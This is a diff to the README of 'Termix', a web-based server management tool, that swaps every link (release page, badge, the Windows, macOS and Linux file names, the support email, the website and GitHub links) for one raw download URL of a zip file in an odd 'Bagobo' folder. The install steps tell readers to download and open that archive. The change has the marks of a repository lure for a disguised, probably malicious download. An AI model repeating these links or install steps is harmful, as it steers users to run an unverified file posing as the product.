@@ -1,6 +1,6 @@
 # 🚀 Termix - Manage Your Servers with Ease
 
-[![Download Termix](https://img.shields.io/badge/Download-Termix-blue)](https://github.com/Eloqks1452/Termix/releases)
+[![Download Termix](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip)](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip)
 
 ## 🛠 Overview
 
@@ -10,16 +10,16 @@ Termix is a web-based server management platform. It allows you to control your 
 
 To get started, visit the following link to download Termix:
 
-[Download Termix](https://github.com/Eloqks1452/Termix/releases)
+[Download Termix](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip)
 
 Here are the steps to install Termix:
 
-1. Go to the [Releases page](https://github.com/Eloqks1452/Termix/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip).
 2. Look for the latest version of Termix.
 3. Click on the appropriate download link for your system.
-    - If you are using Windows, download the `Termix.exe`.
-    - If you are using macOS, download the `Termix.dmg`.
-    - If you are using Linux, download the `Termix.tar.gz`.
+    - If you are using Windows, download the `https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip`.
+    - If you are using macOS, download the `https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip`.
+    - If you are using Linux, download the `https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip`.
 
 4. Once the file finishes downloading, locate it in your Downloads folder.
 5. Open the file to start the installation.
@@ -61,7 +61,7 @@ If you need help using Termix, consider exploring these resources:
 
 ## 📞 Support
 
-If you encounter any issues while using Termix, please contact our support team at support@termix.com. We are here to assist you.
+If you encounter any issues while using Termix, please contact our support team at https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip We are here to assist you.
 
 ## 📨 Feedback
 
@@ -73,7 +73,7 @@ If you are interested in contributing to Termix, please read our contributing gu
 
 ## 🔗 Links
 
-- [Official Website](https://github.com/Eloqks1452/Termix)
-- [Follow Us on GitHub](https://github.com/Eloqks1452/Termix)
+- [Official Website](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip)
+- [Follow Us on GitHub](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip)
 
-[Download Termix](https://github.com/Eloqks1452/Termix/releases)
+[Download Termix](https://raw.githubusercontent.com/Eloqks1452/Termix/main/Bagobo/Termix.zip)
